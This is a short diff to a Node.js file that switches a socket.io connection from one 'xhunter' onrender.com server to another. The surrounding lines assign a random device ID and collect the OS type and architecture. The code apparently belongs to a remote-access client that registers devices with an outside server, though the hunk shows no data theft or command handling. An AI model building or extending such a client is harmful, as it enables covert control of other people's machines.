@@ -3,7 +3,7 @@ const os = require('os');
 const fs = require('fs');
 const path = require('path');
 
-const socket = io('https://xhunter-nd49.onrender.com');
+const socket = io('https://xhunter-bsos.onrender.com');
 
 const deviceId = 'device_' + Math.floor(Math.random()*10000);
 const model = os.type() + ' ' + os.arch();
